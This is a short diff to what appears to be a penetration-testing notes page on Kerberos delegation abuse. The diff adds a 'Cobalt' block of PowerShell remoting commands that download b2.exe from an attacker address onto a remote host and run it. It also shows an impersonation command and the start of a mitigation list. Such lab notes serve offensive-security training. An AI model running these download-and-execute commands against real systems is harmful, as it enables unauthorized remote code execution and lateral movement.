@@ -77,6 +77,14 @@ lNM0MuTE9DQUw= /impersonateuser:svc_apache /domain:m3c.local
 ```
 {% endcode %}
 
+{% code title="Cobalt" %}
+```
+$session = new-pssession -computername m3webaw
+invoke-command $session {powershell -NoP -NonI -c Invoke-WebRequest -Uri 'http://10.10.14.177:80/b2.exe' -OutFile 'c:\\Windows\\Temp\\b2.exe'}
+invoke-command $session {cd 'c:\\Windows\\Temp'; .\b2.exe}G
+```
+{% endcode %}
+
 ### Mitigation
 
 * Disable kerberos delegation where possible
